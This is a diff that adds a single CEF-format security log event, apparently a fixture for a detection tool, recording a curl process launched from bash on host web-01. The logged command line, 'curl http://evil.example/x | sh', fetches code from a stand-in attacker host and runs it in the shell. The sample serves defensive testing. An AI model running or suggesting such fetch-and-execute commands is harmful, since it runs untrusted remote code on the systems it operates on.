@@ -1,0 +1,1 @@
+CEF:0|Zyvor AI Labs|Kavach|1.0|process-start|Process started|1|rt=1767323045123 cat=process externalId=e1 dvchost=web-01 dvcpid=4242 sproc=/usr/bin/curl suid=1000 cs1Label=command cs1=curl http://evil.example/x | sh cs2Label=parentExecutable cs2=/bin/bash
